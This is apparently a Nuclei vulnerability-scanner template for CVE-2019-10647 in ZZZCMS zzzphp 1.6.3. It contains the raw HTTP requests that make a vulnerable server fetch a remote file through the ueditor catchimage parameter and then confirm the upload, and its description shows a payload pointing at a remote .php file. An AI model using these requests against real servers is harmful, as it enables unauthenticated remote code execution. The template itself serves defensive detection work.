id: CVE-2019-10647

info:
  name: ZZZCMS ZZZPHP 1.6.3 â€“ Remote PHP Code Execution (RCE)
  author: Sourabh-Sahu
  severity: critical
  description: |
    ZZZCMS zzzphp v1.6.3 allows remote attackers to execute arbitrary PHP code via a .php URL in the plugins/ueditor/php/controller.php?action=catchimage source[] parameter because of a lack of inc/zzz_file.php restrictions. For example, source%5B%5D=http%3A%2F%2F192.168.0.1%2Ftest.php can be used if the 192.168.0.1 web server sends the contents of a .php file (i.e., it does not interpret a .php file).
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2019-10647
    - https://github.com/kyrie403/Vuln/blob/master/zzzcms/zzzphp%20v1.6.3%20write%20file%20with%20dangerous%20type.md
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2019-10647
    cwe-id: CWE-434
    cpe: cpe:2.3:a:zzzcms:zzzphp:1.6.3:::::::*
  metadata:
    verified: true
    max-request: 1
    vendor: ZZZCMS
    product: ZZZPHP
  tags: rce,file-upload,unauthenticated,critical

variables:
  file: "{{randstr}}.txt"
  url: "{{interactsh-url}}/{{file}}"

flow: http(1) || http(2)

http:
  - raw:
      - |
        POST /plugins/ueditor/php/controller.php?action=catchimage HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        source[]={{url}}

    extractors:
      - type: regex
        name: filename
        group: 1
        internal: true
        regex:
          - '"title":"([^"]+)"'

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
  - raw:
      - |
        GET /upload/{{filename}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

    matchers:
      - type: status
        status:
          - 200
